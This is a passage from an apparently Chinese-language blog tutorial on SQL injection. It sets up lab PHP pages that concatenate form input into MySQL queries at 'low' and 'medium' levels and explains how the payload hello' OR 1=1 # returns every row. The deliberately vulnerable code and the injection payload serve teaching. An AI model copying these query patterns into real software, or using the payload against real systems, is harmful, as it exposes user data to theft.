class=\"string\">\"https://code.jquery.com/jquery-3.2.1.slim.min.js\"</span> <span class=\"attr\">integrity</span>=<span class=\"string\">\"sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN\"</span> <span class=\"attr\">crossorigin</span>=<span class=\"string\">\"anonymous\"</span>&gt;</span><span class=\"undefined\"></span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span> <span class=\"attr\">src</span>=<span class=\"string\">\"https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.3/umd/popper.min.js\"</span> <span class=\"attr\">integrity</span>=<span class=\"string\">\"sha384-vFJXuSJphROIrBnz7yo7oB41mKfc8JzQZiCq4NCceLEaO4IHwicKwpJf9c9IpFgh\"</span> <span class=\"attr\">crossorigin</span>=<span class=\"string\">\"anonymous\"</span>&gt;</span><span class=\"undefined\"></span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span> <span class=\"attr\">src</span>=<span class=\"string\">\"https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0-beta.2/js/bootstrap.min.js\"</span> <span class=\"attr\">integrity</span>=<span class=\"string\">\"sha384-alpBpkh1PFOepccYVYDB4do5UnbKysX5WZXm3XxPqe5iKTfUKjNkCk9SaVuEZflJ\"</span> <span class=\"attr\">crossorigin</span>=<span class=\"string\">\"anonymous\"</span>&gt;</span><span class=\"undefined\"></span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">title</span>&gt;</span>sql 注入测试<span class=\"tag\">&lt;/<span class=\"name\">title</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">\"card\"</span> <span class=\"attr\">style</span>=<span class=\"string\">\"width: 20rem;\"</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">\"card-body\"</span>&gt;</span></span><br><span class=\"line\">                <span class=\"tag\">&lt;<span class=\"name\">form</span> <span class=\"attr\">method</span>=<span class=\"string\">\"POST\"</span> <span class=\"attr\">action</span>=<span class=\"string\">\"index.php\"</span>&gt;</span></span><br><span class=\"line\">                    <span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">\"form-group\"</span>&gt;</span></span><br><span class=\"line\">                    <span class=\"tag\">&lt;<span class=\"name\">label</span> <span class=\"attr\">class</span>=<span class=\"string\">\"col-form-label\"</span> <span class=\"attr\">for</span>=<span class=\"string\">\"formGroupExampleInput\"</span>&gt;</span>SQL query<span class=\"tag\">&lt;/<span class=\"name\">label</span>&gt;</span></span><br><span class=\"line\">                    <span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">\"text\"</span> <span class=\"attr\">class</span>=<span class=\"string\">\"form-control\"</span> <span class=\"attr\">name</span>=<span class=\"string\">\"content\"</span> <span class=\"attr\">id</span>=<span class=\"string\">\"content\"</span> <span class=\"attr\">placeholder</span>=<span class=\"string\">\"Example input\"</span>&gt;</span></span><br><span class=\"line\">                    <span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">                    <span class=\"tag\">&lt;<span class=\"name\">button</span> <span class=\"attr\">type</span>=<span class=\"string\">\"submit\"</span> <span class=\"attr\">class</span>=<span class=\"string\">\"btn btn-primary\"</span>&gt;</span>Submit<span class=\"tag\">&lt;/<span class=\"name\">button</span>&gt;</span></span><br><span class=\"line\">                <span class=\"tag\">&lt;/<span class=\"name\">form</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">html</span>&gt;</span></span><br></pre></td></tr></table></figure></p>\n<p><code>index.php</code><br><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;html&gt;</span><br><span class=\"line\">    &lt;head&gt;</span><br><span class=\"line\">        &lt;meta charset=<span class=\"string\">\"UTF-8\"</span>&gt;</span><br><span class=\"line\">        &lt;link rel=<span class=\"string\">\"stylesheet\"</span> href=<span class=\"string\">\"https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0-beta.2/css/bootstrap.min.css\"</span> integrity=<span class=\"string\">\"sha384-PsH8R72JQ3SOdhVi3uxftmaW6Vc51MKb0q5P2rRUpPvrszuE4W1povHYgTpBfshb\"</span> crossorigin=<span class=\"string\">\"anonymous\"</span>&gt;</span><br><span class=\"line\">        &lt;script src=<span class=\"string\">\"https://code.jquery.com/jquery-3.2.1.slim.min.js\"</span> integrity=<span class=\"string\">\"sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN\"</span> crossorigin=<span class=\"string\">\"anonymous\"</span>&gt;&lt;/script&gt;</span><br><span class=\"line\">        &lt;script src=<span class=\"string\">\"https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.3/umd/popper.min.js\"</span> integrity=<span class=\"string\">\"sha384-vFJXuSJphROIrBnz7yo7oB41mKfc8JzQZiCq4NCceLEaO4IHwicKwpJf9c9IpFgh\"</span> crossorigin=<span class=\"string\">\"anonymous\"</span>&gt;&lt;/script&gt;</span><br><span class=\"line\">        &lt;script src=<span class=\"string\">\"https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0-beta.2/js/bootstrap.min.js\"</span> integrity=<span class=\"string\">\"sha384-alpBpkh1PFOepccYVYDB4do5UnbKysX5WZXm3XxPqe5iKTfUKjNkCk9SaVuEZflJ\"</span> crossorigin=<span class=\"string\">\"anonymous\"</span>&gt;&lt;/script&gt;</span><br><span class=\"line\">        &lt;title&gt;SQL 注入&lt;/title&gt;</span><br><span class=\"line\">    &lt;/head&gt;</span><br><span class=\"line\">    &lt;body&gt;</span><br><span class=\"line\">        <span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> ($_POST[content]) &#123;</span><br><span class=\"line\">            $db_host = <span class=\"string\">\"localhost\"</span>;</span><br><span class=\"line\">            $db_user = <span class=\"string\">\"my_user\"</span>;</span><br><span class=\"line\">            $db_password = <span class=\"string\">\"my_password\"</span>;</span><br><span class=\"line\">            $db_name = <span class=\"string\">\"my_db\"</span>;</span><br><span class=\"line\">            $content = $_POST[content];</span><br><span class=\"line\">            $query = <span class=\"string\">\"SELECT * FROM users WHERE name = '$content'\"</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">            $conn = mysqli_connect($db_host,$db_user,$db_password,$db_name);</span><br><span class=\"line\">            $result = mysqli_query($conn, $query);</span><br><span class=\"line\"></span><br><span class=\"line\">            var_dump();</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (mysqli_num_rows($result)) &#123;</span><br><span class=\"line\">                <span class=\"keyword\">while</span> ($row = mysqli_fetch_array($result)) &#123;</span><br><span class=\"line\">                    <span class=\"keyword\">echo</span> <span class=\"string\">\"Your name is \"</span> . $row[<span class=\"number\">1</span>] . <span class=\"string\">\"&lt;/br&gt;\"</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">                <span class=\"keyword\">echo</span> <span class=\"string\">\"No Found!\"</span>;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            mysqli_close($conn);</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            var_dump($_POST);</span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"string\">\"Don't get your content!\"</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"meta\">?&gt;</span></span><br><span class=\"line\">    &lt;/body&gt;</span><br><span class=\"line\">&lt;/html&gt;</span><br></pre></td></tr></table></figure></p>\n<p>表中数据<br><img src=\"/images/sql1.png\" alt=\"\"><br>正常输入<br><img src=\"/images/sql2.png\" alt=\"\"><br><img src=\"/images/sql3.png\" alt=\"\"><br><img src=\"/images/sql4.png\" alt=\"\"><br><img src=\"/images/sql5.png\" alt=\"\"><br>异常输入<br><img src=\"/images/sql6.png\" alt=\"\"><br><img src=\"/images/sql7.png\" alt=\"\"></p>\n<p>问题在于<code>SELECT * FROM users WHERE name = &#39;$content&#39;</code>在接收前端输入的字符串时，直接拼接查询语句,当输入为<code>hello&#39; OR 1=1 #</code>时,将语句拼接完成就是<code>SELECT * FROM users WHERE name = &#39;hello&#39; OR 1=1 #&#39;</code>,其中<code>hello</code>后的一个单引号将查询语句的第一个单引号关闭了,接下来就是<code>OR</code>语句的真子句,最后将多余的单引号注释掉,那么这个查询永远为真,查询语句就会将数据库中所有的数据都返回。</p>\n<h2 id=\"SQL注入续\"><a href=\"#SQL注入续\" class=\"headerlink\" title=\"SQL注入续\"></a>SQL注入续</h2><p><code>low.php</code><br><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"></span><br><span class=\"line\">$db_host = <span class=\"string\">\"localhost\"</span>;</span><br><span class=\"line\">$db_user = <span class=\"string\">\"my_user\"</span>;</span><br><span class=\"line\">$db_password = <span class=\"string\">\"my_password\"</span>;</span><br><span class=\"line\">$db_name = <span class=\"string\">\"my_db\"</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">$user = $_POST[ <span class=\"string\">'username'</span> ];</span><br><span class=\"line\"></span><br><span class=\"line\">$pass = $_POST[ <span class=\"string\">'password'</span> ];</span><br><span class=\"line\">$pass = md5( $pass );</span><br><span class=\"line\"></span><br><span class=\"line\">$query  = <span class=\"string\">\"SELECT * FROM `users` WHERE user = '$user' AND password = '$pass';\"</span>;</span><br><span class=\"line\">$conn = mysqli_connect($db_host,$db_user,$db_password,$db_name);</span><br><span class=\"line\">$result = mysqli_query($conn, $query);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span>( $result &amp;&amp; mysqli_num_rows( $result ) == <span class=\"number\">1</span> ) &#123;</span><br><span class=\"line\">\t$row    = mysqli_fetch_assoc( $result );</span><br><span class=\"line\">\t$avatar = $row[<span class=\"string\">\"avatar\"</span>];</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">echo</span> <span class=\"string\">\"&lt;p&gt;Welcome to the password protected area &#123;$user&#125;&lt;/p&gt;\"</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">echo</span> <span class=\"string\">\"&lt;img src=\\\"&#123;$avatar&#125;\\\" /&gt;\"</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">\t<span class=\"keyword\">echo</span> <span class=\"string\">\"&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;\"</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">mysqli_close($conn);</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure></p>\n<p><code>medium.php</code><br><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"></span><br><span class=\"line\">$db_host = <span class=\"string\">\"localhost\"</span>;</span><br><span class=\"line\">$db_user = <span class=\"string\">\"my_user\"</span>;</span><br><span class=\"line\">$db_password = <span class=\"string\">\"my_password\"</span>;</span><br><span class=\"line\">$db_name = <span class=\"string\">\"my_db\"</span>;</span><br><span class=\"line\">$conn = mysqli_connect($db_host,$db_user,$db_password,$db_name);</span><br><span class=\"line\"></span><br><span class=\"line\">$user = $_POST[ <span class=\"string\">'username'</span> ];</span><br><span class=\"line\"></span><br><span class=\"line\">$pass = $_POST[ <span class=\"string\">'password'</span> ];</span><br><span class=\"line\">$user = mysqli_real_escape_string($conn, $user);</span><br><span class=\"line\">$pass = mysqli_real_escape_string($conn, $pass);</span><br><span class=\"line\">$pass = md5( $pass );</span><br><span class=\"line\"></span><br><span class=\"line\">$query  = <span class=\"string\">\"SELECT * FROM `users` WHERE user = '$user' AND password = '$pass';\"</span>;</span><br><span class=\"line\">$result = mysqli_query($conn, $query);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span>( $result &amp;&amp; mysqli_num_rows( $result ) == <span class=\"number\">1</span> ) &#123;</span><br><span class=\"line\">\t$row    = mysqli_fetch_assoc( $result );</span><br><span class=\"line\">\t$avatar = $row[<span class=\"string\">\"avatar\"</span>];</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">echo</span> <span class=\"string\">\"&lt;p&gt;Welcome to the password protected area &#123;$user&#125;&lt;/p&gt;\"</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">echo</span> <span class=\"string\">\"&lt;img src=\\\"&#123;$avatar&#125;\\\" /&gt;\"</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">\t<span class=\"keyword\">echo</span> <span class=\"string\">\"&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;\"</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">mysqli_close($conn);</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure></p>\n<p><code>sql.php</code><br><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;html&gt;</span><br><span class=\"line\">    &lt;head&gt;</span><br><span class=\"line\">        &lt;meta charset=<span class=\"string\">\"UTF-8\"</span>&gt;</span><br><span class=\"line\">        &lt;link rel=<span class=\"string\">\"stylesheet\"</span> href=<span class=\"string\">\"https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0-beta.2/css/bootstrap.min.css\"</span> integrity=<span class=\"string\">\"sha384-PsH8R72JQ3SOdhVi3uxftmaW6Vc51MKb0q5P2rRUpPvrszuE4W1povHYgTpBfshb\"</span> crossorigin=<span class=\"string\">\"anonymous\"</span>&gt;</span><br><span class=\"line\">        &lt;script src=<span class=\"string\">\"https://code.jquery.com/jquery-3.2.1.slim.min.js\"</span> integrity=<span class=\"string\">\"sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN\"</span> crossorigin=<span class=\"string\">\"anonymous\"</span>&gt;&lt;/script&gt;</span><br><span class=\"line\">        &lt;script src=<span class=\"string\">\"https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.3/umd/popper.min.js\"</span> integrity=<span class=\"string\">\"sha384-vFJXuSJphROIrBnz7yo7oB41mKfc8JzQZiCq4NCceLEaO4IHwicKwpJf9c9IpFgh\"</span> crossorigin=<span class=\"string\">\"anonymous\"</span>&gt;&lt;/script&gt;</span><br><span class=\"line\">        &lt;script src=<span class=\"string\">\"https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0-beta.2/js/bootstrap.min.js\"</span> integrity=<span class=\"string\">\"sha384-alpBpkh1PFOepccYVYDB4do5UnbKysX5WZXm3XxPqe5iKTfUKjNkCk9SaVuEZflJ\"</span> crossorigin=<span class=\"string\">\"anonymous\"</span>&gt;&lt;/script&gt;</span><br><span class=\"line\">        &lt;title&gt;SQL 注入&lt;/title&gt;</span><br><span class=\"line\">    &lt;/head&gt;</span><br><span class=\"line\">    &lt;body&gt;</span><br><span class=\"line\">        <span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> ($_POST[content]) &#123;</span><br><span class=\"line\">            $db_host = <span class=\"string\">\"localhost\"</span>;</span><br><span class=\"line\">\t\t\t$db_user = <span class=\"string\">\"my_user\"</span>;</span><br><span class=\"line\">\t\t\t$db_password = <span class=\"string\">\"my_password\"</span>;</span><br><span class=\"line\">\t\t\t$db_name = <span class=\"string\">\"my_db\"</span>;</span><br><span class=\"line\">            $content = $_POST[content];</span><br><span class=\"line\">            $query = <span class=\"string\">\"SELECT first_name,last_name FROM users WHERE user_id = '$content'\"</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">            $conn = mysqli_connect($db_host,$db_user,$db_password,$db_name);</span><br><span class=\"line\">            $result = mysqli_query($conn, $query);</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"keyword\">if</span> (mysqli_num_rows($result)) &#123;</span><br><span class=\"line\">                <span class=\"keyword\">while</span> ($row = mysqli_fetch_array($result)) &#123;</span><br><span class=\"line\">                \t$first = $row[<span class=\"string\">\"first_name\"</span>];</span><br><span class=\"line\">\t\t\t$last  = $row[<span class=\"string\">\"last_name\"</span>];</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t\t<span class=\"keyword\">echo</span> <span class=\"string\">\"&lt;pre&gt;ID: &#123;$id&#125;&lt;br /&gt;First name: &#123;$first&#125;&lt;br /&gt;Surname: &#123;$last&#125;&lt;/pre&gt;\"</span>; </span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">                <span class=\"keyword\">echo</span> <span class=\"string\">\"No Found!\"</span>;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            mysqli_close($conn);</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            var_dump($_POST);</span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"string\">\"Don't get your content!\"</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"meta\">?&gt;</span></span><br><span class=\"line\">    &lt;/body&gt;</span><br><span class=\"line\">&lt;/html&gt;</span><br></pre></td></tr></table></figure></p>\n<p><code>user.html</code><br><figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">html</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">meta</span> <span class=\"attr\">charset</span>=<span class=\"string\">\"UTF-8\"</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">link</span> <span class=\"attr\">rel</span>=<span class=\"string\">\"stylesheet\"</span> <span class=\"attr\">href</span>=<span class=\"string\">\"https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0-beta.2/css/bootstrap.min.css\"</span> <span class=\"attr\">integrity</span>=<span class=\"string\">\"sha384-PsH8R72JQ3SOdhVi3uxftmaW6Vc51MKb0q5P2rRUpPvrszuE4W1povHYgTpBfshb\"</span> <span class=\"attr\">crossorigin</span>=<span class=\"string\">\"anonymous\"</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">script</span> <span class=\"attr\">src</span>=<span class=\"string\">\"https://code.jquery.com/jquery-3.2.1.slim.min.js\"</span> <span class=\"attr\">integrity</span>=<span class=\"string\">\"sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN\"</span> <span class=\"attr\">crossorigin</span>=<span class=\"string\">\"anonymous\"</span>&gt;</span><span class=\"undefined\"></span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span> <span class=\"attr\">src</span>=<span class=\"string\">\"https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.3/umd/popper.min.js\"</span> <span class=\"attr\">integrity</span>=<span class=\"string\">\"sha384-vFJXuSJphROIrBnz7yo7oB41mKfc8JzQZiCq4NCceLEaO4IHwicKwpJf9c9IpFgh\"</span> <span class=\"attr\">crossorigin</span>=<span class=\"string\">\"anonymous\"</span>&gt;</span><span class=\"undefined\"></span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span> <span class=\"attr\">src</span>=<span class=\"string\">\"https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0-beta.2/js/bootstrap.min.js\"</span> <span class=\"attr\">integrity</span>=<span class=\"string\">\"sha384-alpBpkh1PFOepccYVYDB4do5UnbKysX5WZXm3XxPqe5iKTfUKjNkCk9SaVuEZflJ\"</span> <span class=\"attr\">crossorigin</span>=<span class=\"string\">\"anonymous\"</span>&gt;</span><span class=\"undefined\"></span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">style</span>&gt;</span><span class=\"undefined\"></span><br><span class=\"line\">  \t\tdiv&#123;</span><br><span class=\"line\">\t\t    border:1px;</span><br><span class=\"line\">\t\t    width:400px;</span><br><span class=\"line\">\t\t    margin:20px auto;</span><br><span class=\"line\">\t\t  &#125;</span><br><span class=\"line\">\t</span><span class=\"tag\">&lt;/<span class=\"name\">style</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">title</span>&gt;</span>sql 注入测试<span class=\"tag\">&lt;/<span class=\"name\">title</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">\"card\"</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">\"card-body\"</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">h2</span>&gt;</span>Login<span class=\"tag\">&lt;/<span class=\"name\">h2</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">form</span> <span class=\"attr\">action</span>=<span class=\"string\">\"medium.php\"</span> <span class=\"attr\">method</span>=<span class=\"string\">\"POST\"</span>&gt;</span></span><br><span class=\"line\">\t\t\tUsername:<span class=\"tag\">&lt;<span class=\"name\">br</span>&gt;</span></span><br><span class=\"line\">\t\t\t<span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">\"text\"</span> <span class=\"attr\">class</span>=<span class=\"string\">\"form-control\"</span> <span class=\"attr\">name</span>=<span class=\"string\">\"username\"</span> <span class=\"attr\">placeholder</span>=<span class=\"string\">\"username\"</span>&gt;</span></span><br><span class=\"line\">\t\t\tPassword:<span class=\"tag\">&lt;<span class=\"name\">br</span>&gt;</span></span><br><span class=\"line\">\t\t\t<span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">\"password\"</span> <span class=\"attr\">class</span>=<span class=\"string\">\"form-control\"</span> <span class=\"attr\">name</span>=<span class=\"string\">\"password\"</span> <span class=\"attr\">placeholder</span>=<span class=\"string\">\"password\"</span>&gt;</span></span><br><span class=\"line\">\t\t\t<span class=\"tag\">&lt;<span class=\"name\">br</span>&gt;</span></span><br><span class=\"line\">\t\t\t<span class=\"tag\">&lt;<span class=\"name\">button</span> <span class=\"attr\">type</span>=<span class=\"string\">\"submit\"</span> <span class=\"attr\">class</span>=<span class=\"string\">\"btn btn-primary\"</span>&gt;</span>Login<span class=\"tag\">&lt;/<span class=\"name\">button</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;/<span class=\"name\">form</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">html</span>&gt;</span></span><br></pre></td></tr></table></figure></p>\n<h3 id=\"初步注入\"><a href=\"#初步注入\" class=\"headerlink\" 